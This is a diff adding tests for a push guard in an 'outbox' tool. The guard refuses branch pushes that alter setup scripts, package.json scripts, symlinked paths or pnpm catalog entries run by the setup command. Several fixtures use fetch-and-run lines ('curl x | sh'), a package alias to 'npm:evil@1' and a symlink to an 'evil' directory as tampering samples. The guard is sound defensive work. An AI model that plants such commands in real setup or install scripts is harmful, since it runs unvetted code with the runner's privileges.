@@ -10,6 +10,7 @@ import { POINTER_HEAD, lfsVersion } from "../scripts/lib/lfs.mjs";
 import { openOutbox, parsePointer } from "../scripts/lib/outbox.mjs";
 import { KEPT_QUESTION, openKeptCheck } from "../scripts/lib/kept.mjs";
 import { gitError } from "../scripts/lib/inputs.mjs";
+import { setupPaths } from "../scripts/lib/logic.mjs";
 
 const quiet = { GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
 
@@ -260,7 +261,7 @@ test("outbox: the setup command's script is toolchain to a fix pass; a fence tha
   r.put(r.work, "scripts/setup.sh", "echo setup\n");
   r.run(r.work, "commit", "-q", "-m", "setup");
   r.run(r.work, "push", "-q", "origin", "HEAD:main");
-  const box = await open(r, { toolchain: ["scripts/setup.sh"] });
+  const box = await open(r, { toolchain: { paths: ["scripts/setup.sh"], scripts: [], unresolved: [] } });
   await box.fence({ plan: "1. owns `app.txt`", texts: ["FAIL app.txt:1 expected v3"] });
   r.put(r.work, "app.txt", "v3\n");
   r.put(r.work, "scripts/setup.sh", "echo setup; curl x | sh\n");
@@ -285,6 +286,163 @@ test("outbox: the setup command's script is toolchain to a fix pass; a fence tha
   r2.run(r2.work, "commit", "-q", "-m", "fix");
   assert.equal(await box2.push(), false);
   assert.match(box2.error, /^the fix pass's changes could not be read/);
+});
+
+test("outbox: a package.json script the setup command runs is refused on every push; the rest of package.json is the worker's (#387)", async () => {
+  const r = repos();
+  const pkg = (scripts, deps = {}) => `${JSON.stringify({ scripts, dependencies: deps }, null, 2)}\n`;
+  r.put(r.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs", test: "node --test" }));
+  r.run(r.work, "commit", "-q", "-m", "package");
+  r.run(r.work, "push", "-q", "origin", "HEAD:main");
+  const box = await open(r, { setup: "npm run bootstrap" });
+  r.put(r.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs", test: "node --test --watch" }, { zod: "^4" }));
+  r.run(r.work, "commit", "-q", "-m", "a dependency and another script");
+  assert.equal(await box.push(), true, box.error);
+  r.put(r.work, "package.json", pkg({ prebootstrap: "curl x | sh", bootstrap: "node tools/bootstrap.mjs", test: "node --test --watch" }, { zod: "^4" }));
+  r.run(r.work, "commit", "-q", "-m", "a pre script setup would run");
+  assert.equal(await box.push(), false);
+  assert.equal(box.errorKind, "protected");
+  assert.match(box.error, /^changed package\.json scripts\.prebootstrap, which the setup command runs as the runner/);
+
+  // The default branch changing the script after the branch left it is not the branch's change.
+  const r2 = repos();
+  r2.put(r2.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs" }));
+  r2.run(r2.work, "commit", "-q", "-m", "package");
+  r2.run(r2.work, "push", "-q", "origin", "HEAD:main");
+  r2.run(r2.other, "pull", "-q", "origin", "main");
+  r2.put(r2.other, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs --v2" }));
+  r2.run(r2.other, "commit", "-q", "-m", "a maintainer's change");
+  r2.run(r2.other, "push", "-q", "origin", "HEAD:main");
+  const box2 = await open(r2, { setup: "npm run bootstrap" });
+  r2.put(r2.work, "package.json", pkg({ bootstrap: "node tools/bootstrap.mjs" }, { zod: "^4" }));
+  r2.run(r2.work, "commit", "-q", "-m", "a dependency");
+  assert.equal(await box2.push(), true, box2.error);
+});
+
+/** A push through a fresh outbox: `main` files and links on the default branch, then `work` (files, `link:` targets) committed on the branch. */
+async function guardPush({ main = {}, work = {}, setup, before = null }) {
+  const r = repos();
+  const place = (files) => {
+    for (const [p, t] of Object.entries(files)) {
+      if (t === null) r.run(r.work, "rm", "-q", "-r", p);
+      else if (t.startsWith("link:")) {
+        mkdirSync(join(r.work, p, ".."), { recursive: true });
+        rmSync(join(r.work, p), { recursive: true, force: true });
+        symlinkSync(t.slice(5), join(r.work, p));
+        r.run(r.work, "add", p);
+      } else r.put(r.work, p, t);
+    }
+  };
+  place(main);
+  r.run(r.work, "commit", "-q", "-m", "main");
+  r.run(r.work, "push", "-q", "origin", "HEAD:main");
+  if (before) await before(r, place);
+  const box = await open(r, { setup });
+  place(work);
+  r.run(r.work, "commit", "-q", "-m", "work");
+  const ok = await box.push();
+  return { ok, error: box.error, kind: box.errorKind };
+}
+
+test("outbox: a link along a guarded path is followed, on the default branch and in the push; a directory above one counts (#387 B1)", async () => {
+  const local = await guardPush({ main: { "tools/local/setup.sh": "1\n", ".local": "link:tools/local" }, work: { "tools/local/setup.sh": "2\n" }, setup: "bash .local/setup.sh" });
+  assert.equal(local.ok, false, ".local -> tools/local: an edit to tools/local/setup.sh is an edit to what setup runs");
+  assert.equal(local.kind, "protected");
+  const sl = await guardPush({ main: { "scripts/real.sh": "1\n", sl: "link:scripts" }, work: { "scripts/real.sh": "curl x | sh\n" }, setup: "bash sl/real.sh" });
+  assert.equal(sl.ok, false, "sl -> scripts: an edit to scripts/real.sh");
+  const made = await guardPush({ main: { "tools/setup.sh": "1\n", "evil/setup.sh": "curl x | sh\n" }, work: { tools: "link:evil" }, setup: "bash tools/setup.sh" });
+  assert.equal(made.ok, false, "a new link made at a directory above the path");
+  assert.match(made.error, /^changed tools/);
+});
+
+test("outbox: pnpm-workspace.yaml's packages list stays the branch's though setup runs pnpm; a catalog change is refused (#387 R1)", async () => {
+  const ws = "packages:\n  - 'packages/*'\ncatalog:\n  zod: ^4\n";
+  const members = await guardPush({ main: { "pnpm-workspace.yaml": ws }, work: { "pnpm-workspace.yaml": ws.replace("  - 'packages/*'\n", "  - 'packages/*'\n  - 'tools/*'\n") }, setup: "pnpm install" });
+  assert.equal(members.ok, true, members.error);
+  const catalog = await guardPush({ main: { "pnpm-workspace.yaml": ws }, work: { "pnpm-workspace.yaml": ws.replace("^4", "npm:evil@1") }, setup: "pnpm install" });
+  assert.equal(catalog.ok, false);
+  assert.match(catalog.error, /^changed pnpm-workspace\.yaml, which the setup command runs/);
+});
+
+test("outbox: a script the default branch has fixed since the branch left no longer refuses the push once the stage starts from the fix (#387)", async () => {
+  const broken = `${JSON.stringify({ scripts: { bootstrap: "bash $GEN" } })}\n`;
+  const fixed = `${JSON.stringify({ scripts: { bootstrap: "bash scripts/gen.sh" } })}\n`;
+  const still = await guardPush({ main: { "package.json": broken }, work: { "app.txt": "v2\n" }, setup: "npm run bootstrap" });
+  assert.equal(still.ok, false, "unresolved where the branch left and at the start");
+  const moved = await guardPush({
+    main: { "package.json": broken },
+    work: { "app.txt": "v2\n" },
+    setup: "npm run bootstrap",
+    // The default branch fixes it, and the branch, already pushed, carries the same fix (its stage start) unmerged.
+    before: async (r, place) => {
+      r.run(r.work, "fetch", "-q", "origin");
+      r.run(r.work, "checkout", "-q", "-b", "trunk-fix", "origin/main");
+      place({ "package.json": fixed });
+      r.run(r.work, "commit", "-q", "-m", "fix");
+      r.run(r.work, "push", "-q", "origin", "HEAD:main");
+      r.run(r.work, "checkout", "-q", "factory/1");
+      place({ "package.json": fixed });
+      r.run(r.work, "commit", "-q", "-m", "same fix");
+      r.run(r.work, "push", "-q", "origin", "HEAD:factory/1");
+    },
+  });
+  assert.equal(moved.ok, true, moved.error);
+});
+
+test("outbox: what setup runs beyond the files it names is refused on push: a script's files, a path it names that is not there yet, a new package's script setup does not run is not (#387)", async () => {
+  const r = repos();
+  r.put(r.work, "package.json", `${JSON.stringify({ scripts: { bootstrap: "node tools/boot.mjs" } })}\n`);
+  r.put(r.work, "tools/boot.mjs", "1\n");
+  r.run(r.work, "commit", "-q", "-m", "package");
+  r.run(r.work, "push", "-q", "origin", "HEAD:main");
+  const push = async (files, setup = "npm run bootstrap && bash scripts/later.sh") => {
+    const r2 = repos();
+    for (const [p, t] of Object.entries({ "package.json": `${JSON.stringify({ scripts: { bootstrap: "node tools/boot.mjs" } })}\n`, "tools/boot.mjs": "1\n" })) r2.put(r2.work, p, t);
+    r2.run(r2.work, "commit", "-q", "-m", "package");
+    r2.run(r2.work, "push", "-q", "origin", "HEAD:main");
+    const box = await open(r2, { setup });
+    for (const [p, t] of Object.entries(files)) r2.put(r2.work, p, t);
+    r2.run(r2.work, "commit", "-q", "-m", "work");
+    const ok = await box.push();
+    return { ok, error: box.error, kind: box.errorKind };
+  };
+  const card = await (await open(r, { setup: "npm run bootstrap" })).setupFiles();
+  assert.ok(card.files.includes("tools/boot.mjs") && card.scripts.some((x) => x.name === "bootstrap"), "the outbox reads what setup runs for the cards, on the default branch");
+  const script = await push({ "tools/boot.mjs": "2\n" });
+  assert.equal(script.ok, false);
+  assert.equal(script.kind, "protected");
+  assert.match(script.error, /^changed tools\/boot\.mjs, which the setup command runs/, "a file the script setup runs names");
+  const created = await push({ "scripts/later.sh": "curl x | sh\n" });
+  assert.equal(created.ok, false, "a path setup names that the default branch does not hold yet");
+  const member = await push({ "web/package.json": `${JSON.stringify({ scripts: { bootstrap: "curl x | sh" } })}\n`, "app.txt": "v2\n" });
+  assert.equal(member.ok, true, member.error);
+  const unknown = await push({ "app.txt": "v2\n" }, "bash $SETUP");
+  assert.equal(unknown.ok, false);
+  assert.match(unknown.error, /^the setup command runs \$SETUP .*which Factory cannot resolve/);
+});
+
+test("outbox: a fix pass may not change the install command's package.json script, and with a command Factory cannot resolve, no file out of scope (#387)", async () => {
+  const r = repos();
+  r.put(r.work, "package.json", '{"scripts":{"deps":"node deps.mjs"}}\n');
+  r.run(r.work, "commit", "-q", "-m", "package");
+  r.run(r.work, "push", "-q", "origin", "HEAD:main");
+  const box = await open(r, { toolchain: setupPaths({ install: "npm run deps" }) });
+  await box.fence({ plan: "1. owns `app.txt`", texts: ["FAIL app.txt:1 expected v3"] });
+  r.put(r.work, "app.txt", "v3\n");
+  r.put(r.work, "package.json", '{"scripts":{"deps":"true"}}\n');
+  r.run(r.work, "commit", "-q", "-m", "fix, and skip the install");
+  assert.deepEqual(await box.outside(), ["package.json scripts.deps"]);
+
+  const r2 = repos();
+  const unknown = setupPaths({ setup: "bash $SETUP" });
+  const box2 = await open(r2, { toolchain: unknown });
+  await box2.fence({ plan: "1. owns `app.txt`", texts: ["FAIL app.txt:1 expected v3"] });
+  r2.put(r2.work, "app.txt", "v3\n");
+  r2.put(r2.work, "lib/util.sh", "echo\n");
+  r2.run(r2.work, "commit", "-q", "-m", "fix, and a file setup may run");
+  assert.deepEqual(await box2.outside(), ["lib/util.sh"]);
+  assert.equal(await box2.push(), false);
+  assert.match(box2.error, /The setup or install command runs \$SETUP .*which Factory cannot resolve/);
 });
 
 test("outbox: a pack Factory's object check stops reading early is a refused push, never a crash", async () => {
